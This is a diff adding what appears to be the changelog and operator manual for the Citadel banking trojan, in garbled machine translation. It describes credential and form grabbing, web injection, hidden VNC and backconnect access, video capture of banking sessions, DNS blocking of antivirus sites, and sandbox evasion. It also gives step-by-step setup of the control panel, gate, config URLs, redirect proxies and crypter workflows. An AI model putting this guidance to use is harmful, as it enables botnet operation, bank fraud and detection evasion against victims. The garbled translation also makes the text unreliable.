@@ -1,0 +1,715 @@
+Version 1.3.4.5
+Manual Version: 2.0 (last updated 06/06/2012)
+
+List of new features for the bot:
+[+] Fixed a bug in the VNC Vista / Windows 7. Now we can fully work with Internet Explorer 8 (remember, there was a problem with the rendering of IE)
+[+] Support for Mozilla Firefox 7.0 (fixed an issue where not sent reports to the latest versions of the browser)
+[+] Crypto-protection (body decrypted in memory).
+[+] Redirects DNS (not through the hosts). You can block / redirect any URLs without fear that they will notice heuristics. For example AV-block or redirect servers are pagu bank to another host.
+! BONUS! List URLs of popular anti-virus software to block comes.
+[+] Version information in the report sotfa. Will send you a detailed version of the browser Holder together with the report. It helps in simulated settings Holder.
+[+] Extra level of protection for the server on trackers - Login Key.
+[+] Mechanism autintefikatsii boot config (no direct URLs.) It gives full protection from the established trackers.
+[+] Support grabber Google Chrome. [Tested on the latest 15.x/16.x/17.x].
+[+] Support injector Google Chrome. [Tested on the latest 15.x/16.x/17.x].
+[+} Added caching of search functions, which speeds up the installation of hooks Chrome.
+[+] Added ability to execute system commands CMD at the start of the bot (section CMDList) sending a report to the server. For example, you need to for installs, the team went a result of "ipconfig / all", or a list of all available ball. It is useful in analyzing the internal structure of companies. (For example, often come across bots in LAN with the names of ACCOUNTANT_PC, POS_SERV, DATABASE ...)
+[+] Added a mechanism to verify the safety hooks on some Windows.
+[+] Heuristic analysis environment a sheet with a stop to unwanted software (greatly increases stealth), included all the popular anti-virus software.
+[+] Fixed minor bugs.
+[+] Video Grabber. A unique opportunity to monitor the work of your injector "eyes holder" in the config file specifies a list of sites and the length of video recording in seconds, at call on a given link is activated video recording format. Mkv. It is recommended to configure your server to receive files 60 MB 10.
+[+] Removed the delete cookies when installs, considering it knocks "fingerprint" when working with Holder bays.
+[+] Added support for HTTP 1.0 and the extended headers (eg responz not always look like "HTTP/1.1 200 OK", is "HTTP/1.1 200 follow document", in this case, after the code is 200 more words) applies to browsers Firexfox & Chrome
+[+] Added a gate generator (in case you want your files to an intermediate host for a round-trip).
+[+] Completely redone encrypt (data, record logs / video, download configs, etc) in the Citadel, to replace the outdated RC4 used in Zeus, came to AES 128. Recall that gave asechku RC4, when mass produced were different decryptors config / injector for Zeus, and the hosts began to palitsya abuse.ch.
+Now, in addition to the built-RC4, which is encrypted with your personal signature, the software is also built-in AES encryption, the output we get the AES128 secure handling bot <-> gate. No ZeusDecryptor'y (ThreatExpert) and automate reversing will not interfere with your comfort in the moment (Jan 2012).
+[+] All the basic functionality, the remainder is present from Zeus. I think you should not write it here again.
+[+] Fixed a bug report IN records from Web-filters in the configuration with the "!" (Neglect), which was to exclude all references given, and instead did the opposite and write to a log.
+[+] Added new option in the filter config-file, and it is a function to send or not send the cookies on the server.
+Option static config disable_cookies 0/1 indicates whether to disable grabbing cookies (1 - disable 0 - enable).
+Manual, also, cookies may be obtained from the admin team user_cookies_get, if you really need.
+[+] Added the function of any open page deflotovym user's browser on the boat.
+For example, if you want to cheat any counter or statistics on voting or want to dop.dohod with your botnet shopami opening page (as well as: pharmaceutical, gambling, drop-projects, etc.). A great way to advertise the necessary Page!
+A new option url_open <url>
+[+] New type of filter WebFilters in the configuration file in the assembly.
+Two new parameters: P and G.
+Parameter P is given to the link points to a record only POST requests (all others are ignored), with this link.
+The parameter G indicates the recording just GET requests (all others are ignored) with the given link.
+Parameters can not be combined, ie should indicate any one of them.
+[+] Added a modular software system that gives us:
+* Scalability and load any operating functional bot-oriented for the Citadel.
+All modules are loaded from the server and dynamically decompressed in memory, which eliminates their detection.
+Storage and transfer to the outside world only in encrypted form.
+The modules are loaded in a process of trust, so weighty save memory.
+Great handling - modules can be disabled via the config.
+[+] Video Grabber remade on a modular basis. Now the weight of the build nekriptovannogo <190 kb. Always.
+[+] Added new option timer_modules (timings for loading modules).
+[+] Added support for new Google Chrome browser 17, and fixed a bug with handling Flash'a in it.
+[+] Added support for macros. Introduced macros:% BOTID%,% BOTNET%
+* Can be inserted into any part of the injector macro data and upload to your server (AS / injected), transferred the name of the boat and the name of a botnet.
+[+] Added commands four modules (on / off, Disable / enable the download.)
+[+] Added new option disable_httpgrabber 1/0 for Chrome: eliminates the handling of conventional HTTP (not HTTPS) requests.
+[+] Added a full account in the User-Agent reports HTTP (S) grabber allows cloning holdersky UserAgent through any type of utility CCTools.
+[+] Added an entry screen resolution reports HTTP (S) grabber, an example of "Screen (w: h): 1600:900" - useful when cloning settings Holder, many banks are paying attention.
+[+] Changed the protocol to send video files to reduce load on the server (some have had problems with the load on the server and it is strongly inhibited)
+[+] Added ability to send jabber-notifications to multiple recipients in admin Citadel.
+[+] Added ability to specify multiple url_config'ov (the way to the main config file), used to be this: if you have the basic configuration is not available at the time installs a bot, then the backup can not be downloaded, and now this problem will not be trying to pull off and the bot config from another URL'a (You can enter up to 20 reserve).
+[+] Fixed a bug in Google Chrome (17x) leads to a sub-hang, when you open multiple tabs with injected.
+[+] Added new command:
+- Getting information about installed software (the list - the company | product | version) on your computer: info_get_firewall
+- Getting information about the installed antivirus on your computer: info_get_antivirus
+- Getting information about the installed firewall on your computer: info_get_firewall
+The information comes as a separate report for each bot. Soon integrate the bulk statistics of the installed software in admin Citadel.
+[+] The algorithm for a number of antiemulyatsii AB (not considered kriptor, software has become invisible for a few proaktivok).
+[+] Fixed a problem running as SYSTEM.
+[+] Added Jabber-specific notifications upon detection of bots specified by mask (eg a mask * corporate *, will look botid with such a coincidence), even if they did not send any log files, the script will notify you in Jabber-communication about the appearance of a bot . Now you do not miss the eye past the security bots.
+[+] The admin has a new section of "Efficiency and Security", we had integrated with the service scan4you, and now you can one-click check all of your executables builds at once in the admin palevnost Citadel, well, you can set automatic scan every file day, and if one of your files by more than third palitsya antivirus, you will immediately receive a notification in your Jabber, so you can
+immediately replace the exe file. Now, the mechanism will work for you automatically, too lazy to health!
+[+] Some customers have complained that only 40% of bots to the new updated version of the exe, the rest can not upgrade for some unknown reason. Indeed, the bug was from the time of Zeus, we have investigated and corrected. Now, a new parameter in the config file: timer_autoupdate 8
+In which set the time (in hours), how often to download exe file and restart the server (RC4 key must match). 80% of the bots are now updated successfully, and the crypt perezalivat exe, survival increased by 37.1%, your bots will have the most fresh and clean build.
+[+] Changed the system to send reports to a server in previous versions of each report, place the unit sends a POST request to the gate, in the new scheme, reports are sent a pack of a few pieces, it allows to minimize the number of sessions on the server and the server load is minimal, to withstand a large number of bots online.
+[+] Video format from bots changed to. Webm (HTML5), we have built online video player admin Citadel, now you can watch videos right in your brauezere (recommended Opera). Of the possibilities: Fast назад-вперед/фулл-скрин/поиск video BotID, IP-address, date.
+But that was not enough and we went on, many of you use (it is time to use and develop all industries combined) AZ and personal admin for injector / akkov collection, etc. Would you like from your admin to watch over the bay, or how you inject on the boat? It's easy! We created the API-system, you can now send BotID or IP-address of the script, and the API will return to you ready to code HTML-embed all the videos on the bot and you can insert and watch at least a narod.ru, without going to the admin Citadel.
+[+] Added a handy parser parser system commands (CMDList) in the control panel, you can now see the new format as a table, the results of the system commands such as: ipconfig, a list of PCs on a LAN, a list of processes, etc.
+[+] Now when you install the build on the bot will automatically be sent to the one-time admin cleduschaya information: installed firewalls, antivirus software installed, installed programs.
+You can look for a particular boat, and for the entire botnet. We have created a separate section, where you can see all the statistics in the form of visual graphics and calculations. Now you know whom to fight.
+[+] Added ability to "Selected logs", you can tag any interesting account (account) when searching for data in the admin and then easily find it unnecessarily, he will be allocated a different color.
+[+] Implemented injector compatible with UTF-8 (now injected, you can insert any of the languages ​​such as Japanese, Chinese, etc.)
+[+] A crypt in the admin panel Citadel. This section in the admin panel that allows you to update the bot exe file directly from the web. At any time, you can redownload the right exe file and boots it will download in a timely manner. History is in the format of downloads: File | Date Downloads | Paid (Y / N)
+Regarding the latter point, we divided the powers and created a separate category of users with "kriptera" - these users have access to your panel as you wish, and the only privilege of the user - the ability to update the exe file, and you can mark in the table, paid concrete crypts or not.
+You can enable jabber-notification of result checking scan4you.
+[+] Added full-screen screenshots (option in the config file - "@ @").
+[+] Improved avtoapdeytinga: If you are faced with a big load on the server when you upgrade (or bots do not move to the new admin panel), this fix corrects this situation. Fix includes:
+- Old report from the previous version are removed during the upgrade exe (tmp file), an additional safety net.
+- Heavy Records (video and other file report) further validated and removed in case of problems (for example, if the file already downloaded)
+- Changed the initialization apdeytinga, resulting in isklchyuchen deadloc and the opportunity to further update when a file system error.
+[+] Fixed the problem of garbage in the admin log: Logging removed completely Flash-movies (swf / flv) from logs and the whole Facebook, because a lot of trash talking from them.
+[+] Module "Qualitative test WebSocks" is now built into the admin panel, no extra scripts. Shows: country, state, city, hostname, uptime and ping lag.
+Ability to enter this section without a password, for convenience when you need urgent Sox smile.gif
+[+] Module "log parser" is now built into the admin panel, no extra scripts. The interface is much improved, the ability to create "the chosen domain," "archive logs" and the ability to parse https or http domain names to choose from. Builds up a visual table of all domain names that appear in the logs.
+[+] Added "Notes" in the admin Citadel, something like a online notepad. Admin interface is adapted for tablets iPad / Galaxy Tab.
+[+] Improved module "VNC-admin panel", now it is built directly into the admin Citadel, no extra scripts. All set to 1 click. Many new features, namely:
+- Ability to work with the API, you pass BotID or IP-address of the script, for example through the inject, and it sets the VNC / BackConnect Socks-connection by sending data to connect you with Jabber. You can call the script at any time, apply to AZ.
+- Instead of each report in the "Database Search" appeared four buttons: "Add to Favorites", "Connect VNC", "Connect BC Socks", "Autoconnect VNC", "Autoconnect BC SOCKS"
+- AutoConnect VNC when this option is enabled, the bot will install vnc-connection at each resume online, unless you disable it.
+- AutoConnect BC Socks when this option is enabled, the bot will set backconnect socks connection for each output in the online, the other options provide one-time connection.
+- Now you can automatically generate VNC / BC SOCKS-connection as soon as the boat came from the right account for URL-mask, parse hotcakes.
+- Next to each account for URL-mask write date of last entry in this ACC (last login), you no longer need to check on the activity of accounts - for you it will make scripts.
+- Ability of any notice of a few Jabber'ov immediately.
+[+] Fixed problem with chain hooks in Chrome.
+[+] When you start user_execute with the flag "-f" to force is put only apdeytinga exe and will not be run as a installer.
+[+] Optimized work gate, thus reducing the load. Simplifying admin installer that allows you to install all modules in one click.
+[+] Added support for new version of Chrome 18 [injected / formgrabbing]
+[+] Added button "All reports bot" in the admin, you can view the beginning and end of the reporting on the specific bot.
+[+] Fixed a bug with manual command dns_filter_add, blocking URLs are now working correctly.
+[+] Fixed bug with display of exe files on the main page, now deleted exe disappear automatically.
+[+] Fixed a bug with the work of the Task Scheduler scan4you, a daily check of the exe file is working correctly.
+[+] Added a unified system of CRON-one cron-job runs all tasks now: jabber-notice inspection of files, work units, etc.
+[+] Added ability to delete a video from admin.
+[+] Added a reference to the notes in Jabber bot in the VNC-module.
+[+] Updated GeoIP database (late 2011).
+[+] Last of the domain AdvancedConfigs triggered with a delay, is made in order to protect your backup URLs from automatically grabbing hanipotami.
+[+] Fixed a script in the zip archive data in the admin (fsarc.php)
+[+] Settings Jabber-account and all parameters are now made in the general settings.
+[+] Now you can specify the path in the config file with httpS :/ / (unsigned certificates held)
+[+] Fixed case-sensitivity to inject now <BODY> and <body> the same entity. All injected insensitive.
+[+] Completely redesigned interface web admin, user-friendly.
+[+] Added online preview screenshots from the admin. Screens are arranged in series in order of appearance, it is easy to switch back and forth keys are sorted. There is no point to download more pictures and watch one. Virtual Keyboard / pages can be seen consistently.
+[+] Added otstuk history, you can view your stats otstuk botnet (the active, total, percentage) for a week, fortnight or month.
+[+] Added the version history of software, you can see statistics on the Citadel updates in your botnet. Will you know how many bots taken over to the new version, and how much is left on the old. Draw a diagram.
+[+] Ability to search log, only bots that are online.
+[+] Ability to search across multiple logs of keywords at once, and they can be saved as an alias and not when you next enter the search again, simply choose from the list.
+[+] Added button "Cookies" in the context menu on the bot, which allows for the rapid withdrawal of all Cookies bot, if you do not cut off. Saves time.
+[+] Integrated functionality to export FTP-accounts in the API, useful if you are using a third-party software-class FTP-Iframer, allows us to derive a plain-text/xml/php format ftp-acca on the date.
+[+] Added button "Whois" to view the report, one click lets get all the information on the IP-address of the report.
+[+] Added a comment to the bot when viewing the report, as well as the time when the boat was last online.
+[+] Created a new section "Selected Records", which allows you to save a quick link to the desired report + nimu comment. For example, if you come across an interesting account, click "Add to Favorites" and a report will be displayed in a separate section, with automatic data Whois'om your comment. Keep acca on the spot.
+[+] Added antiemulyator, which allows you to protect your botnet on the reversing and getting into trackers. When you start, build a detective that he was running in a virtual machine or a sandbox CWSandbox, VMware, Virtualbox, Sandbox, he starts to behave differently and your botnet go unnoticed. Details were not disclosed, tk's announcement is in the Public and the technology is very tricky.
+Of the minuses: can not test the work in Vmware, have to do it on a real PC or Dedik. The option is moved to the config. antiemulation_enable 0/1
+[+] Added Bot status "Online / Offline" when viewing the report.
+[+] One of the most important features: Preview report in the search logs. No need to open more than 200 windows in your browser to view each report, and each link. Now you can easily click on a preview to make a report, and if the report will be of interest, then view the full version.
+Supported by the rapid switching between reports keys back and forth-ESC.
+[+] Updated cronjob script cleanup of old scripts (commands). Now everyone has to work without bugs.
+[+] Added context menu option "Screenshots bot"
+[+] Module VNC-admin: added sorting by date of last connection / OS (for example, if you only need to WinXP).
+[+] Module log parser: added sorting by domain / number of reports in descending order.
+[+] FTP-module ifreymer: Fixed bug with "smart" ifreymingom when the quotes in the code iframe-screened. The current owners are encouraged perezalit script pad.
+[+] Since the previous encryption algorithm has been hacked a few months later, because of this, some customers got into ZeusTracker. We have developed and implemented a new encryption algorithm based on modified RC4. In cryptography uses a special key known only to the client. that requires its presence for decryption. Because each client's own indvidualny key, now from one client will not suffer all the rest. If you got one, others will be protected from this. Now we are completely isolated from the automatic analysis builds. As a result, we obtain the two-level authorization, protection from the boat trackers.
+[+] Did cropping options X-Frame-Options in Header'ah, unnecessarily, it may interfere with some inzhekta work.
+[+] Be done to correct formgrabbinga / inzhektinga in Chrome 19 (19.0.1084.52m)
+[+] Works faster on large botnets admin.interfeysa + gate expense of functional optimization GeoIP-database.
+
+-------------------------------------------------- --------------------------
+UNDERSTANDING TO SIMPLIFY THE INFORMATION, YOU CAN SKIP SECTIONS
+Where is the INSTALLATION AND USE OF UNITS THAT you do not get
+USE CTRL + F to search for key words and definitions.
+EXAMPLE OF ADEQUATE TIME UNDERSTANDING OF ALL FUNCTIONS SOFT - 1 WEEK.
+-------------------------------------------------- --------------------------
+
+1) Access to CRM
+
+http://citadelmovement.com/crm/
+First citadel; rightway
+then
+Login: XXXXXXXXXXXXX
+Password: XXXXXXXXXXXXX
+
+What is Citadel CRM Store?
+It is a system of interaction between our customers and the developer.
+Perhaps you are familiar with the situation where a support product ignore your request to icq / jabber 'e - this contributes to a high load of the person who is responsible for all this because a lot of customers, and he is one, but still busy with chores.
+With us, this problem is not relevant. Especially for you has developed a system through which you can immediately report a bug in software, and we, in turn, it quickly fixed a, if any. All requests received more than one person at a time, with notices of jabber / sms. You quickly get a response within the ticket system.
+
+Do you have a great idea to finalize the software and you want to share it with the developer (even if it's even the smallest idea: for example you do not like the icon in the menu) - we're going to meet you.
+You can create two types of applications (see projects) within the CRM:
+
+a) Public Bid - a bid to the topic description + (better put TK), which will see all clients, they can discuss it in the comments, offer good value for money for the implementation of and to vote: do this application or send it to the trash.
+You can create these types of applications, and can vote and do any act in relation to other requests of our customers.
+
+b) The private bid - if you want to offer our developers indvidualnuyu problem and a good price for the implementation, this type of application for you. It can only see the developers (ie us) and you. If all conditions are satisfied both sides, this module only get you.
+
+All topical application, you can see in the "discussion on"
+The right to vote has 4 meanings:
+We need, I get
+Useful, but I do not need
+Absolutely not needed
+No need, I do not possess
+
+Please, if you see a new application - vote for it, even if you do not need it! We have a very narrow range, so it is YOUR opinion is crucial by for ALL, do not stay on the sidelines.
+
+Any developments within the CRM (solutions, applications, comments) you will be notified by jabber-bot channel. This is done for your convenience, so you do not refresh the page every time. But still, it is useful to go every 3 days in SRM'ku =) The faster voice and opinions are - so speedily develop our product.
+
+If the application is gaining a lot of abandoned votes, it goes to the "Application Rejected" and closes.
+If the application is approved by the developers, it goes to the "Under Construction"
+For each application in this section, we make changes to the format of date - what has been done
+So you can see the process of working on the module.
+Do not forget to specify the desired advertised price per module, for which you would have appreciated the improvement.
+All the news we publish in the "News" section, if you do not come to notice in Jabber, please report it immediately to our support!
+You go once every 3-4 days in the CPM and check the news and comments on the request.
+
+2) A list of useful links that will help you:
+ 1) VMWare Workstation 6.5.0 + VMWare Tools + Crack:
+ http://www.citadelmovement.com/software/VMware-workstation-6.5.0-118166.exe
+ 2) The image of the English-language Windows XP SP3 (Corporate Edition):
+ http://www.citadelmovement.com/software/Microsoft_C2AE_Windows_XP_SP3_Corporate.iso
+ Key: MXDJT-W3TCG-2KGQH-YPMK3-F6CDG
+ 3) Development Kit to create an injector + examples (author unknown):
+ http://www.citadelmovement.com/software/injects_development.zip
+ 
+3) Install Citadel
+
+Folders:
+builder - Builder Kit
+backconnect - Download BackConnect VNC admin, namely, php scripts for Backconnect Windows server.
+webserver (either server [php] - admin panel, gate
+
+
+************************************************** ******************************
+========================== >>>>> Step-By-Step Installation Citadel
+************************************************** ******************************
+
+********************
+Requirements for the >>>>>>>>>> server.
+********************
+
+PHP> 5.3, Mysql 5 (preferably the latest version)
+cron, apache. At the request of nginx and control panel cPanel or DirectAdmin.
++ Windows VPS if purchased VNC admin (on the module below)
+
+
+
+********************
+Step 1 >>>>>>>>>>
+********************
+
+When you start builder.exe, will be a line
+Authorization key: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+This is your key to indvidualny protection trackers (we call it even LOGIN KEY)
+It must be placed in the file webserver / system / global.php, which contains the line
+define ('BO_LOGIN_KEY', 'PUT_KEY_HERE');
+Insert the key here, ie obtained
+define ('BO_LOGIN_KEY', 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX');
+
+THIS VERY CAREFULLY CHECKING THE MOMENT! 80% of Fit Clients simply forget HERE YOUR KEY FROM Builder AND SO IN GLOBAL.PHP BOT does not knock in the Admin. Check this MOMENT PLEASE! If a key already entered, then everything is OK.
+
+Then set chmod 777 on the folder:
+system
+system / data
+
+Also, it is necessary to put before setting chmod 777 on the entire folder webserver, after a complete installation - the right to return the folder to chmod 755
+
+Following these above actions, I've found open webserver / api.php
+and change the line define ('API_TOKEN_KEY', 'changethispassword');
+
+for any random password, for example define ('API_TOKEN_KEY', 'dgwd23gwegw');
+
+This is necessary so that you are protected from hacking and you are not compromised through the script API, deflotovy change your password.
+
+********************
+Step 2: >>>>>>>>>>
+********************
+
+We go to http://www.htaccesstools.com/htpasswd-generator/
+Enter any name and password is issued a line of type a: $ apr1 $ HE / llFvK $ u3YAEGm277SkotywpTl9w /
+Save this one line in the file. Htpasswd in the webserver directory
+After that, create a new one. Htaccess file in the directory webserver
+There we write:
+
+<Files Cp.php>
+AuthName "Your ID"
+AuthType Basic
+AuthUserFile / put / do / faila / .htpasswd
+require valid-user
+</ Files>
+
+Where / put / do / faila / .htpasswd - replace to your unix-end path.
+
+Now, when entering the admin cp.php, additional protection is a pair of login and password.
+You can do things differently and not to create. Htpasswd, but simply to create a. Htaccess file and write there a line:
+
+<Files Cp.php>
+Order Deny, Allow
+Deny from all
+Allow from 111.111.106.111
+</ Files>
+
+Where 111.111.106.111 - your constant IP, now the admin panel will be available only from your IP.
+Which way you prefer - you choose.
+
+********************
+Step 3: >>>>>>>>>>
+********************
+
+Open the file config.txt and consider new options inherited from the old versions of Zeus remained the same, so we will not dwell on them attention.
+
+  entry "Video"
+    a quality
+    length 60
+  end
+
+Section for setting videograbbera: length the length of each video in seconds is recommended that no more than 10 minutes (600 seconds) formed a very weighty because the patched files.
+Quality - from 1 to 5, the video quality. It is recommended to keep a default, to save on the amount of video files.
+Video recording is triggered when approaching the desired link and we removed exactly length-seconds.
+To specify that we need to take a mask, go to the section entry "WebFilters"
+  "# * Paypal.com / *"
+  
+  # symbol in front of the mask is activated recording.
+  
+The section is very thin, because quite a heavy load on the server, specify the exact how to mask and only the very links you need (for example bank.akki)
+It is recommended to configure the server apache & php - for receiving files over 50 MB via POST.
+Guide to setting up a server is here # http://jdownloads.ru/faq/8-how-uploadbigfiles.html
+Test your attentively surveying the video is NOT a virtual machine, unnecessarily due to lack of correct ones, may be such that on virtualke will not shoot video.
+
+Videos are added to the format. Webm, in a folder _reports / * BOTNAME * / videos /
+They can be found by searching for files in the admin, or browse through the online player (section "View Video"). It is recommended to view in Opera and Firefox, other browsers are not tested.
+
+ entry "CmdList"
+    "Hostname"
+    "Net view"
+    "Ipconfig / all"
+  end
+  
+A list of system commands that the bot will perform for the first time on a running system, and send to the admin panel.
+In the admin, you can find the commands as a result of the type of report, "The result of CMD-command"
+With him will be a list: the bot - the result of command execution
+in a convenient format (Section CMD-Parser)
+
+  encryption_key "key"
+  Be sure to ask here a random key, this key is also known as RC4 Encryption Key - you have to ask the admin to install the uninstaller, you can change it in Settings. It should not be too complicated or too simple, identical in configuration and admin. Not recommended to put more than 10 characters! You should use lower case and special symbols!
+  
+ entry "DnsFilters"
+    "Microsoft.com = 127.0.0.1"
+    "Myspace.com = 127.0.0.1"
+    "Gruposantander.es = 127.0.0.1"
+  end
+
+Ability to create a DNS-redirect or block the AV-server, or an unwanted URL (for example, if you find that downloading the logs go to someone else and need someone to block the gate).
+Specifies the IP-address for the redirect.
+DNS Redirect does not work for browsers, but for all software, which will be knocking at this domain. All these requests will be redirected to your IP.
+
+Now it is important! The resulting config BUILD, exe file and video.modulya (to create it, you press the button Assemble modules), we put in a folder webserver / files /
+As a result, we get 3 files in the folder files. Config video.modul, exe file. Do not forget to zakriptovany exe file before placing it in the folder, otherwise it will be such that the timer auto-update, the bots will start downloading the exe, which palitsya.
+
+ url_config1 "http://localhost/file.php|file=test_config.bin"
+  Specify here test_config.bin - the name of our config, we have filled in the files / taking into account where the file file.php (as it lies above the folder files). The symbol | you should not confuse, it is here specifically.
+  
+ url_config1 must be specified, you can also write multiple backup config URLs, in case the first domain while you sleep went to Down, unnecessarily bots will not reach your config if you will not be able to download the basic configuration.
+ In this case, write another line under the url_config1:
+ 
+ url_config2 "http://localhost/file.php|file=test_config.bin"
+ Is optional. But there can specify up to 20 backup configs, the bot will turn to knock on each of the URLs have not yet set a config file. In the last url_config bot knocking delayed 5 hours, this is done to protect against automatic parsing URLs reverser.
+ 
+ 
+ url_loader "http://localhost/file.php|file=test_bot.exe"
+  test_bot.exe - here indicate the name of the exe file, which is in the folder files /
+  Do not rename the file file.php, leave with the same name. Way do file.php, directory files / lies next to the file.
+ 
+   url_server "http://localhost/gate.php"
+   It points the way to gate.php
+
+   The rest is configured as Zeus, if you forgot to format, read the manual from Zeus zeus_old.txt
+
+With the advent of version 1.3.0.0 shall appear the need to collect the modules (eg videograbber) to build, unnecessarily bots will pump out the necessary modules from your server.
+Therefore, after the assembled exe, click the button "New Modules" and upload the resulting file / files to the webserver \ files on the server. This is done MUST! EVEN IF YOU DO NOT USE VIDEO.MODUL! AKA BOT WILL NOT knock on the admin.
+   
+  
+  Once we have uploaded the files in the files, and filled the whole folder as a whole created a webserver + database.
+  Go to the address: http://www.vash-host.com/citadel/install
+  And we enter all the values, then delete the directory install.
+  
+
+
+  
+************************************************** ******************************
+Installation ========================== >>>>> BackConnect Windows Server (required for operation of VNC-admin)
+************************************************** ******************************
+
+To install the server side, you need a Windows VPS / Dedicated preferably XP, 2003,2008
+We put the web server XAMPP / WAMP, or any other supporting PHP. Turning off UAC + Windows Firewall, so you can open the ports. Also disable the domain policy and come out completely from any domain.
+Fill in the web directory scripts set backconnect \ winserv_php_gate
+Web admin panel will address: http://ip-serv/control.html
+It will log on the VNC connect.
+Possible problems: because vindovyh firewall, check this point carefully. Do not forget to restart Windows after disabling firewall.
+All scripts must lie at the root of the server, not to create any folders.
+If you do not know how to put XAMPP, that's Manual: http://www.ripecms.com/documentation/articles/installing-apache-php
+
+************************************************** ******************************
+Installation ========================== >>>>> Citadel VNC Admin
+************************************************** ******************************
+
+If you purchased the module VNC-admin, then in your panel will be available to the section "VNC".
+Go over the options with which it can be difficult.
+To get started, you have to press the "Configuration" and write there IP-address Windows-server where you have already filled scripts backconnect'a. No way do not just IP-address.
+What is different from the Connect avtokonnekt?
+If you specify a connection to some bot, it will execute this command one-time fee and you yyshlet data connection. If you ask avtokonnekt, the bot will initiate a connection to backconnect-server every time, as soon as he goes on the Internet. This option applies to both Backconnect Socks, and to the VNC.
+Now we define a URL-masks, which we catch in our VNC admin.
+Mask URL: URL is pointing to the scheme * mail.ru * or http:// *. Bank.com * (can be played as you like, to help you use the asterisk)
+Parameters: Enter here the name POST-variables that are on the form of a site that we catch. On the example of mail.ru, it will be a Login * and Password *
+The format parameter is simple, you can specify "login =", you can specify "login *", or simply "login". So choose as you like, do not forget to test the mask.
+Parameters are not case sensitive.
+Notify me of Jabber?: Put option if you want to make each new captured the ACC come to you. Jabber is defined in the settings, you can specify several, separated by commas.
+IMPORTANT! To see the "Options" were written data Jabber-bot (Use only Jabber.org), from which all this will come to you.
+Also, there is the possibility of creating Avtokonnekta with the bot, which came from the new account in the section. Ie in the gills immediately comes to you account for the konnekta + port on the VNC / SOCKS.
+Do not forget that runs in front of the popup menu bots, links, etc. through the right mouse button: you can delete any unwanted acca (send to trash), mark it as your browser or enable / disable your settings.
+
+Line two boats, six accounts, five live accounts (83%) calculates the% of live accounts on the basis if the bot did not show up in a network of more than 4 days, the account is dead.
+
+Also, there is an API for rapid creation of VNC / SOCKS connections with the right boat, for example during the interception of a token or a message, you should immediately go to the ACC under the Holder, the injector you are a javascript / iframe call a URL to api.php
+ * VNCController
+ * Api.php / <token> / vnc / connect? BotIP = 1.2.3.4 & protocol = VNC
+ * Api.php / <token> / vnc / connect? BotIP = 1.2.3.4 & protocol = SOCKS
+ * Api.php / <token> / vnc / connect? BotId = WIN-ABC123 & protocol = VNC
+ * /
+define ('API_TOKEN_KEY', 'changethispassword');
+
+And pass the IP or BotID, the script tells the bot to establish the connection and the data come to you in zhabber. Timing depends on a parameter in the config timer_stats Builder.
+
+ 
+
+Here's advice on dealing with bots on Win7/Vista: Use Firefox portable for Win7/Vista - it works correctly. Do not forget to disable the wallpaper does not drive much traffic. Also, to get into one of the directories - press the shortcut properties.
+
+************************************************** ******************************
+========================== >>>>> Installing chekinga web proxies
+************************************************** ******************************
+
+Section "SOCKS" in the admin panel - no need to configure anything.
+
+************************************************** ******************************
+========================== >>>>> Installing a log parser
+************************************************** ******************************
+
+With version 1.3.3.3 of the admin module is available under "links", there should be no difficulty.
+
+************************************************** ******************************
+Work with a >>>>> ========================== crypt-panel
+************************************************** ******************************
+There is a section "crypt exe" aka "crypt exe" and it shows in the main admin Citadel. If it's not there, then read below how to activate it.
+It is needed in order for you to grant access to your kripteru and he periodically perezalivat exe file that bots update.
+In this case, kripter does not have access to the rest of the admin, it is only available for this section.
+To begin with, activate this section of at home, for this go to "Users", click on your username below and see a list of options available to us. Tick ​​two points:
+r_svc_crypter_crypt - This item gives privileges perezalivat exe file.
+r_svc_crypter_pay - This item gives privileges to the table payments to perezalivkam.
+
+Then create a new user and give him ONLY "r_svc_crypter_crypt" right, pass the login and password kripteru and it can form a perezalivat exe files in the folder files /
+Do not forget to set chmod 777 on the folder and access to only trusted proxies.
+Now, as soon as kripter perezalivat exe file, a new record in the table that the exe file is not paid, you will, in turn, checking everything is ok, mark in his admin that the crypts of X on a certain date paid.
+You can enter data for the Jabber-notice verification scan4you in this section.
+
+
+************************************************** ******************************
+Installation ========================== >>>>> redirect (gasket for config)
+************************************************** ******************************
+
+Generation of gaskets (file.php) to protect the config (complete system redirects) BETA-version.
+Generator pads solves the problem of transfer file.php on a single host, you can redirect juzat a-laying up to your main config file and the exe file.
+
+Generation of gaskets provides a builder for this new button "Collect pad."
+At the output we get 2 file, file.php, file_config.php (the name specified in the dialog box when you save is ignored (!)).
+NOTE: file_config.php contains your encryption key in a modified form, it is taken out of your config, so the generation of gate configuration must be configured and valid,
+
+Now load the files file_config, php, file.php on the pad and create a folder in the same files, which put the exe, config + video module files.
+
+To prevent direct access to the files in the folder files are creating. Htaccess file as follows:
+deny from all
+
+In the setting of the config ask url_config1, url_loader up pads.
+
+If you want to protect the gate and create a seal, I've found there are other / redir.php, open it and put this path to REAL gate
+/ / URL of the original server.
+$ Url = "http://localhost/s.php";
+
+
+After that, save the sript under any name and set the bot in the config file path as the gate (url_server)
+It is very important! To the host were allowed sockets in PHP, otherwise it will not work.
+You can check this by creating a file with 1.php <? Php phpinfo ();?>
+He must show Sockets Support enabled
+
+Gaskets are not currently transmit video and screenshots, logs only. This is the only minus.!
+
+************************************************** ******************************
+Summary ========================== >>>>> manual for new ficham
+************************************************** ******************************
+
+1) In the admin there is a new section of "Efficiency and Security", we had integrated with the service scan4you, and now you can one-click check all of your executables builds at once in the admin palevnost Citadel, well, you can set up automatic scanning of files once a day and if one of your files over palitsya 3rd antivirus software, you will immediately receive a notification in your Jabber, so you can
+immediately replace the exe file. Now, the mechanism will work for you automatically, too lazy to health!
+
+=> To get started click the Settings button: Enter there Scan4you Profile ID (IMENNO ID, NOT LOGIN!!), Scan4you API Token, Jabber for notifications. Get the data can be in your profile scan4you.net
+Then go to Settings, and enters the data Jabber-bot (pre zaregatsya account for the bot), it is recommended juzat jabber.org
+Everything is ready.
+
+2) Some customers have complained that only 40% of bots to the new updated version of the exe, the rest can not upgrade for some unknown reason. Indeed, the bug was from the time of Zeus, we have investigated and corrected. Now, a new parameter in the config file: timer_autoupdate 8
+In which set the time (in hours), how often to download exe file and restart the server (RC4 encryption_key key must match). 80% of the bots are now updated successfully, and the crypt perezalivat exe, survival increased by 45%, your bots will have the most fresh and clean build.
+
